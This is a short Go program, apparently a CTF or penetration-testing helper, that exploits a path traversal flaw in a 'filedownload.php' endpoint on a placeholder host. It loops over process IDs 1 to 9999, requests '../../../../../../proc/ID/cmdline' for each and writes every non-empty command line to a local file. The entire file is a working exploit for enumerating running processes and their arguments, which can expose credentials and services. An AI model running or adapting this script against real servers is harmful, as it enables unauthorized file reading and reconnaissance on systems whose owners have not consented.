package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"strings"
)

func main() {
	// create file to save
	f, err := os.Create("proc.txt")
	if err != nil {
		panic(err)
	}
	defer f.Close()
	w := bufio.NewWriter(f)

	baseURL := "http://website.com"

	for i := 1; i < 10000; i++ {
		procID := strconv.Itoa(i)
		// fmt.Println("trying ID:", procID)

		// send request
		url := baseURL + "/filedownload.php?file=../../../../../../proc/" + procID + "/cmdline"
		resp, err := http.Get(url)
		if err != nil {
			continue
		}

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			continue
		}
		procData := string(body)

		// cleanup first
		procData = strings.TrimSpace(procData)

		if procData != "" {
			w.WriteString(procID + " ")
			w.WriteString(procData)
			w.WriteString("\n")
			w.Flush()

			fmt.Println(procID, procData)
		}
	}
}
